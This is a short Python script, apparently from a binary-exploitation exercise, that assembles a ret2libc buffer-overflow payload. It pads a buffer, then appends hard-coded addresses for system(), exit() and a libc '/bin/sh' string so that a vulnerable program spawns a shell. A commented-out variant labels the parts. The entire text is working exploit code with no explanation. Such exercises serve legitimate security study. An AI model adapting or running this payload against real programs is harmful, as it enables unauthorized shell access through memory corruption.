#payload = b'\x68\xd5\xff\xffBBBBCCCCDDDDEEEE\x3d\xd5\xff\xff\x68\xd5\xff\xff\xe0\x16\xe0\xf78888\x68\xd5\xff\xff'
#                              |addr payloadstr|    |addr system()  |/bin/sh/ libc |

buf = b'AAAABBBBCCCCDDDDEEEE'
payloadaddr = b'\x1d\xd5\xff\xff'
systemaddr = b'\xe0\x16\xe0\xf7'
exitaddr = b'\x50\x3e\xdf\xf7'
libcsh = b'\x08\x11\xf5\xf7'
payload = buf + payloadaddr + b'FFFF' + systemaddr + exitaddr + libcsh
print(repr(payload))
